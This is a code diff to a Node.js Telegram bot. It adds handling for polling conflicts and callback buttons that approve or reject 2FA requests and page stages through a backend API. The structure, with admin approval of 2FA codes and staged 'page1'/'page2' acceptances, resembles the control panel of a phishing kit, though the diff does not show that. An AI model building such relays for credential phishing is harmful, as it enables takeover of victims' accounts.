@@ -10,8 +10,33 @@ if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
   process.exit(1);
 }
 
-// Initialize bot
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// Initialize bot — polling with timeout to reduce conflicts
+const bot = new TelegramBot(BOT_TOKEN, {
+  polling: {
+    autoStart: true,
+    params: {
+      timeout: 10
+    }
+  }
+});
+
+bot.getMe().then(() => {
+  console.log("✅ Bot connected successfully.");
+}).catch(err => {
+  console.error("❌ Bot connection failed:", err.message);
+});
+
+// Suppress 409 polling errors and auto-restart after delay
+bot.on("polling_error", (err) => {
+  if (err.code === "ETELEGRAM" && err.message.includes("409 Conflict")) {
+    console.warn("⚠️ Polling conflict — another instance may be running. Restarting in 5s...");
+    bot.stopPolling().then(() => {
+      setTimeout(() => bot.startPolling(), 5000);
+    });
+  } else {
+    console.error("❌ Polling error:", err.message);
+  }
+});
 
 // Track pending 2FA requests per chatId
 let pendingRequests = {};
@@ -137,7 +162,7 @@ function send2FACode(code, chatId) {
 }
 
 // -----------------
-// Handle plain text messages (2FA Accept/Reject via keyboard)
+// Handle plain text messages (2FA keyboard Accept/Reject)
 // -----------------
 bot.on("message", (msg) => {
   const chatId = msg.chat.id;
@@ -145,7 +170,6 @@ bot.on("message", (msg) => {
   if (pendingRequests[chatId]) {
     if (msg.text === "Accept") {
       bot.sendMessage(chatId, "✅ 2FA code accepted. Redirecting...");
-      // Add any redirect logic here if needed
       delete pendingRequests[chatId];
     } else if (msg.text === "Reject") {
       bot.sendMessage(chatId, "❌ 2FA code rejected. Please try again.");
@@ -161,6 +185,33 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, identifier] = query.data.split("|");
     let status;
+
+    // --- Handle 2FA approve/reject separately ---
+    if (action === "2fa_approve" || action === "2fa_reject") {
+      const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
+
+      await fetch(`${APP_URL}/api/update-2fa-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
+      });
+
+      try {
+        await bot.editMessageText(
+          `🔐 2FA Request <b>${identifier}</b> has been <b>${twoFaStatus.toUpperCase()}</b>`,
+          {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id,
+            parse_mode: "HTML"
+          }
+        );
+      } catch (_) {}
+
+      await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
+      return;
+    }
+
+    // --- Handle all other approvals ---
     if (action === "accept") status = "accepted";
     else if (action === "page1") status = "accepted1";
     else if (action === "page2") status = "accepted2";
